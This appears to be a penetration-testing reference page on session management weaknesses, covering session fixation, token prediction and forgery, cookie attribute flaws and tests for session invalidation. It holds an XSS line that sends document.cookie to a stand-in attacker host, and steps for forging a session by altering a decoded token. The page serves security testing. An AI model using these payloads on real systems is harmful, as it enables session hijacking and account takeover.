# Session Management Attack Techniques

## Session Fixation Attack

**Setup:** An attacker who can set a specific session cookie on a victim's browser can hijack the victim's session after they log in — IF the session ID doesn't change at login.

**Attack vectors to set a fixed session ID on victim:**
1. **XSS on the domain:** Set cookie via JavaScript
2. **Subdomain takeover:** If parent-domain cookie is used, control any subdomain → set the cookie
3. **Meta refresh / URL injection:** If the app accepts session ID in URL (`?sessionid=X`), phishing link
4. **MITM on HTTP portion:** If any HTTP (not HTTPS) request to the domain exists, inject cookie
5. **HTTP header injection:** If the app has CRLF injection in response headers

**Test:**
```
1. Visit site unauth → note cookie "sess=ABC123"
2. Log in
3. Check cookie — is it still "sess=ABC123"? 
   YES → fixation possible
   CHANGED → rotation happens, fixation not possible
```

## Session Prediction

When session IDs are predictable, an attacker can guess/brute-force valid sessions.

### Entropy Analysis Method
```bash
# Collect 100+ session tokens by repeatedly logging in
# Analyze:
# - Length (< 64 chars = probably too short)
# - Character set (hex only? base64?)
# - Sequential patterns (timestamps, incrementing counters)
# - Hash patterns (recognizable hash prefixes)

# Look for:
# - sess=1609459200-user1234 (timestamp + user ID)
# - sess=abc123abc124abc125... (sequential)
# - sess=<32 chars>... (could be MD5 of known data)
```

### Structured Token Attacks
If tokens follow a pattern:
```
Token: dXNlcjo5OTk6MTY0MjI0MDAwMA==
Decoded (base64): user:999:1642240000
Structure: user:<id>:<timestamp>
Attack: craft token with different user ID → forge session
```

## Cookie Attribute Exploitation

### HttpOnly Missing
If HttpOnly is missing:
```javascript
// Via XSS:
fetch('https://attacker.com/steal?cookie=' + document.cookie);
```

### Secure Missing
If Secure flag is missing and ANY HTTP request exists (even a redirect):
```
User visits http://target.com (will redirect to HTTPS)
But the initial HTTP request includes the session cookie
MITM attacker on the network can capture it
```

### SameSite=None / Missing
Enables CSRF on state-changing operations. See [[csrf]].

### Domain Too Broad
```
Set-Cookie: session=ABC; Domain=.target.com
```
XSS on ANY subdomain (blog.target.com, staging.target.com) can read session cookies for app.target.com.

## Post-Action Invalidation Testing

### Logout Test
```
1. Log in → save token
2. Logout
3. Replay request with old token
   - Still works → invalidation broken
   - 401/403 → properly invalidated
```

### Password Change Test
```
1. Log in on Browser A → save token
2. Log in on Browser B (same account)
3. Change password on Browser B
4. Use Browser A's old token
   - Still works → password change doesn't invalidate sessions (attacker persistence)
```

### Role/Permission Change Test
```
1. Log in as user → save token
2. Admin elevates user to admin
3. Does the token now have admin permissions?
   - Yes → privileges cached, dynamic checks missing
4. Admin demotes user
5. Can the token still perform admin actions?
   - Yes → same issue, worse direction
```

## Concurrent Session Abuse

### Unlimited Sessions
If the app allows unlimited parallel sessions:
- Session theft goes undetected (victim can't see "other device logged in")
- Multiple attackers can use the same account simultaneously
- Device management features may be missing

### Session Hijacking via Fixation + MFA Bypass
```
1. Attacker gets victim's session via fixation before MFA
2. After victim completes MFA, the session is elevated
3. Attacker's session (same ID) is also elevated
```

## Token Storage Abuse

If the app stores tokens in localStorage instead of HttpOnly cookies:
- XSS trivially reads the token
- Tokens persist across browser sessions (no HttpOnly/Secure protection)
- Tokens are available to any subdomain if using `document.domain` manipulation
